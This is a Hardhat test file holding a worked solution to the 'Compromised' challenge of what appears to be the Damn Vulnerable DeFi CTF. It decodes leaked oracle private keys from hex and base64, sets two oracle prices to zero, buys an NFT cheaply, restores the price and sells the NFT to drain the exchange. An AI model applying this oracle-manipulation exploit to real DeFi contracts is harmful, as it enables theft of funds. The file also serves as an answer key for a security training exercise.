const { expect } = require('chai');
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
const { setTracerTag } = require("../common/utils");

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        setTracerTag(deployer.address, "Deployer");
        setTracerTag(player.address, "Player");

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            setTracerTag(sources[i], `Source ${i}`);
        }

        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ['DVNFT', 'DVNFT', 'DVNFT'],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        expect(await ethers.provider.getBalance(exchange.address)).to.eq(EXCHANGE_INITIAL_ETH_BALANCE);

        nftToken = (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());

        setTracerTag(oracle.address, "Oracle");
        setTracerTag(exchange.address, "Exchange");
        setTracerTag(nftToken.address, "NFT");
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // ATTACK POINT: We observed the following message on the net, which
        // seems private keys of the oracles, with which we can manipulate 2
        // of the prices reported by the price oracles. Since the exchange takes
        // the median price from the oracles, we only have to compromise 2 out
        // of the 3 oracles.
        //
        // HTTP/2 200 OK
        // content-type: text/html
        // content-language: en
        // vary: Accept-Encoding
        // server: cloudflare
        //
        // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
        // 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34

        // retrieve the private keys of the oracles from the message
        const key1 = Buffer.from(Buffer.from('4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35'.replaceAll(' ', ''), 'hex').toString(), 'base64').toString();
        const key2 = Buffer.from(Buffer.from('4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'.replaceAll(' ', ''), 'hex').toString(), 'base64').toString();
        const compromisedOracle1 = new ethers.Wallet(key1, ethers.provider);
        const compromisedOracle2 = new ethers.Wallet(key2, ethers.provider);
        expect(compromisedOracle1.address).to.eq(sources[1]);
        expect(compromisedOracle2.address).to.eq(sources[2]);

        // set low prices through the oracles
        await oracle.connect(compromisedOracle1).postPrice('DVNFT', 0);
        await oracle.connect(compromisedOracle2).postPrice('DVNFT', 0);

        // buy an NFT at a low price
        const buyTx = await exchange.connect(player).buyOne({ value: 1 });

        // on the buy completion event
        exchange.on('TokenBought', async function(buyer, tokenId, price) {
            // restore prices through the oracles
            await oracle.connect(compromisedOracle1).postPrice('DVNFT', INITIAL_NFT_PRICE);
            await oracle.connect(compromisedOracle2).postPrice('DVNFT', INITIAL_NFT_PRICE);

            // sell the NFT
            await nftToken.connect(player).approve(exchange.address, tokenId);
            await exchange.connect(player).sellOne(tokenId);
        });

        // wait for the transaction to be mined
        await buyTx.wait(2);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);

        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice('DVNFT')
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
